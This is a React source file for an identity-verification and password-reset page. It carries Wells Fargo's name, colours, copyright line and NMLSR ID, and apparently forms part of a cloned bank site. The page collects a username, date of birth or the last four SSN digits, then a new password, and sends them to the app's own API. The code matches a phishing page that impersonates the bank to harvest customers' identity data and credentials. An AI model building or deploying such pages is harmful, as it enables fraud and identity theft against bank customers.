import { useState, useEffect } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Search, Shield, User, Calendar, CreditCard, ChevronRight, Loader2, Lock, Check } from "lucide-react";
import { Link, useLocation } from "wouter";
import heroBg from "@/assets/images/hero-bg.jpg";

const verificationMethods = [
  {
    id: "username",
    icon: User,
    title: "Username",
    description: "Verify using your account username",
    placeholder: "Enter your username",
  },
  {
    id: "dateOfBirth",
    icon: Calendar,
    title: "Date of Birth",
    description: "Verify using your date of birth",
    placeholder: "YYYY-MM-DD",
  },
  {
    id: "ssn",
    icon: CreditCard,
    title: "Social Security Number",
    description: "Verify using the last 4 digits of your SSN",
    placeholder: "Last 4 digits",
  },
];

const verificationSchema = z.object({
  value: z.string().min(1, "This field is required"),
});

const passwordSchema = z.object({
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

type VerificationFormData = z.infer<typeof verificationSchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function VerifyPage() {
  const [step, setStep] = useState<"choose" | "verify" | "password" | "success">("choose");
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [, setLocation] = useLocation();
  const { toast } = useToast();

  const { data: authData, isLoading, error } = useQuery({
    queryKey: ["/api/auth/me"],
  });

  useEffect(() => {
    if (error) {
      setLocation("/");
    }
  }, [error, setLocation]);

  const user = (authData as any)?.user;

  const verifyForm = useForm<VerificationFormData>({
    resolver: zodResolver(verificationSchema),
    defaultValues: {
      value: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      newPassword: "",
      confirmPassword: "",
    },
  });

  const verifyMutation = useMutation({
    mutationFn: async (data: { verificationType: string; value: string }) => {
      const response = await apiRequest("POST", "/api/auth/verify-identity", data);
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Identity Verified",
        description: "You can now reset your password.",
      });
      setStep("password");
    },
    onError: (error: Error) => {
      toast({
        title: "Verification Failed",
        description: error.message || "The information provided does not match our records.",
        variant: "destructive",
      });
    },
  });

  const resetPasswordMutation = useMutation({
    mutationFn: async (data: { newPassword: string; confirmPassword: string }) => {
      const response = await apiRequest("POST", "/api/auth/reset-password", data);
      return response;
    },
    onSuccess: () => {
      toast({
        title: "Password Updated",
        description: "Your password has been successfully changed.",
      });
      setStep("success");
    },
    onError: (error: Error) => {
      toast({
        title: "Password Reset Failed",
        description: error.message || "Failed to update password.",
        variant: "destructive",
      });
    },
  });

  const skipVerification = () => {
    setLocation("/dashboard");
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-8 h-8 animate-spin text-[#d71e28]" />
      </div>
    );
  }

  if (error || !authData) {
    return null;
  }

  const handleMethodSelect = (methodId: string) => {
    setSelectedMethod(methodId);
    setStep("verify");
    verifyForm.reset();
  };

  const handleVerify = (data: VerificationFormData) => {
    if (selectedMethod) {
      verifyMutation.mutate({
        verificationType: selectedMethod,
        value: data.value,
      });
    }
  };

  const handlePasswordReset = (data: PasswordFormData) => {
    resetPasswordMutation.mutate(data);
  };

  const selectedMethodData = verificationMethods.find(m => m.id === selectedMethod);

  return (
    <div className="min-h-screen flex flex-col">
      <header className="bg-[#d71e28] text-white">
        <div className="max-w-7xl mx-auto px-4 py-2">
          <div className="flex items-center justify-between">
            <Link href="/">
              <span
                className="text-lg font-bold tracking-wide cursor-pointer"
                data-testid="text-logo"
              >
                WELLS FARGO
              </span>
            </Link>

            <nav className="flex items-center gap-4 text-xs">
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-customer-service"
              >
                Customer Service
              </a>
              <a
                href="#"
                className="hover:underline hidden sm:inline"
                data-testid="link-espanol"
              >
                Español
              </a>
              <div className="flex items-center gap-2">
                <Search className="w-4 h-4" />
              </div>
            </nav>
          </div>
        </div>
      </header>

      <div className="bg-[#ffcd41] h-1"></div>

      <main
        className="flex-1 relative"
        style={{
          backgroundImage: `url(${heroBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center bottom",
        }}
      >
        <div className="max-w-lg mx-auto px-4 py-8">
          <Card
            className="shadow-lg border-0 bg-white"
            data-testid="card-verify"
          >
            <CardContent className="p-6 sm:p-8">
              {step === "choose" && (
                <>
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-[#d71e28]/10 rounded-full flex items-center justify-center">
                      <Shield className="w-6 h-6 text-[#d71e28]" />
                    </div>
                    <div>
                      <h1
                        className="text-xl text-gray-800 font-semibold"
                        data-testid="text-title"
                      >
                        Verify your identity
                      </h1>
                      <p className="text-sm text-gray-500">
                        To reset your password, verify your identity first
                      </p>
                    </div>
                  </div>

                  <p className="text-gray-600 text-sm mb-4">
                    Choose a verification method:
                  </p>

                  <div className="space-y-3 mb-6">
                    {verificationMethods.map((method) => (
                      <button
                        key={method.id}
                        onClick={() => handleMethodSelect(method.id)}
                        className="w-full p-4 border border-gray-300 rounded-md text-left hover:border-[#d71e28] hover:bg-red-50 transition-colors"
                        data-testid={`button-method-${method.id}`}
                      >
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-gray-600">
                            <method.icon className="w-5 h-5" />
                          </div>
                          <div className="flex-1">
                            <p className="font-medium text-gray-800">
                              {method.title}
                            </p>
                            <p className="text-sm text-gray-500">
                              {method.description}
                            </p>
                          </div>
                          <ChevronRight className="w-5 h-5 text-gray-400" />
                        </div>
                      </button>
                    ))}
                  </div>

                  <Button
                    onClick={skipVerification}
                    variant="outline"
                    className="w-full h-11 rounded-full"
                    data-testid="button-skip"
                  >
                    Skip and go to Dashboard
                  </Button>
                </>
              )}

              {step === "verify" && selectedMethodData && (
                <>
                  <button
                    onClick={() => setStep("choose")}
                    className="flex items-center gap-2 text-[#d71e28] text-sm mb-4 hover:underline"
                    data-testid="button-back"
                  >
                    <ChevronRight className="w-4 h-4 rotate-180" />
                    Back to options
                  </button>

                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-[#d71e28]/10 rounded-full flex items-center justify-center">
                      <selectedMethodData.icon className="w-6 h-6 text-[#d71e28]" />
                    </div>
                    <div>
                      <h1
                        className="text-xl text-gray-800 font-semibold"
                        data-testid="text-verify-title"
                      >
                        Verify with {selectedMethodData.title}
                      </h1>
                      <p className="text-sm text-gray-500">
                        Enter your information to continue
                      </p>
                    </div>
                  </div>

                  <Form {...verifyForm}>
                    <form
                      onSubmit={verifyForm.handleSubmit(handleVerify)}
                      className="space-y-4"
                    >
                      <FormField
                        control={verifyForm.control}
                        name="value"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700">
                              {selectedMethodData.title}
                            </FormLabel>
                            <FormControl>
                              <Input
                                placeholder={selectedMethodData.placeholder}
                                className="h-12 border-gray-300"
                                data-testid="input-verify-value"
                                maxLength={selectedMethod === "ssn" ? 4 : undefined}
                                type={selectedMethod === "ssn" ? "password" : "text"}
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
                        disabled={verifyMutation.isPending}
                        data-testid="button-verify-submit"
                      >
                        {verifyMutation.isPending ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Verifying...
                          </>
                        ) : (
                          "Verify"
                        )}
                      </Button>
                    </form>
                  </Form>
                </>
              )}

              {step === "password" && (
                <>
                  <div className="flex items-center gap-3 mb-6">
                    <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center">
                      <Lock className="w-6 h-6 text-green-600" />
                    </div>
                    <div>
                      <h1
                        className="text-xl text-gray-800 font-semibold"
                        data-testid="text-password-title"
                      >
                        Reset your password
                      </h1>
                      <p className="text-sm text-gray-500">
                        Identity verified! Create a new password.
                      </p>
                    </div>
                  </div>

                  <Form {...passwordForm}>
                    <form
                      onSubmit={passwordForm.handleSubmit(handlePasswordReset)}
                      className="space-y-4"
                    >
                      <FormField
                        control={passwordForm.control}
                        name="newPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700">
                              New Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Enter new password"
                                className="h-12 border-gray-300"
                                data-testid="input-new-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={passwordForm.control}
                        name="confirmPassword"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel className="text-gray-700">
                              Confirm Password
                            </FormLabel>
                            <FormControl>
                              <Input
                                type="password"
                                placeholder="Confirm new password"
                                className="h-12 border-gray-300"
                                data-testid="input-confirm-password"
                                {...field}
                              />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />

                      <Button
                        type="submit"
                        className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
                        disabled={resetPasswordMutation.isPending}
                        data-testid="button-reset-password"
                      >
                        {resetPasswordMutation.isPending ? (
                          <>
                            <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                            Updating...
                          </>
                        ) : (
                          "Reset Password"
                        )}
                      </Button>
                    </form>
                  </Form>

                  <Button
                    onClick={skipVerification}
                    variant="outline"
                    className="w-full h-11 rounded-full mt-4"
                    data-testid="button-skip-password"
                  >
                    Skip and go to Dashboard
                  </Button>
                </>
              )}

              {step === "success" && (
                <>
                  <div className="flex flex-col items-center text-center py-4">
                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
                      <Check className="w-8 h-8 text-green-600" />
                    </div>
                    <h1
                      className="text-xl text-gray-800 font-semibold mb-2"
                      data-testid="text-success-title"
                    >
                      Password Updated
                    </h1>
                    <p className="text-gray-500 mb-6">
                      Your password has been successfully changed. You can now continue to your account.
                    </p>
                    <Button
                      onClick={() => setLocation("/dashboard")}
                      className="w-full h-11 bg-[#d71e28] hover:bg-[#b91c23] rounded-full"
                      data-testid="button-continue-dashboard"
                    >
                      Continue to Dashboard
                    </Button>
                  </div>
                </>
              )}

              <div className="mt-6 pt-6 border-t border-gray-200">
                <p className="text-xs text-gray-500 text-center">
                  Having trouble?{" "}
                  <a href="#" className="text-[#d71e28] hover:underline">
                    Contact us
                  </a>{" "}
                  for help with verification.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-4">
        <div className="max-w-7xl mx-auto px-4">
          <p
            className="text-xs text-gray-500 text-center"
            data-testid="text-copyright"
          >
            © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801.
          </p>
        </div>
      </footer>
    </div>
  );
}
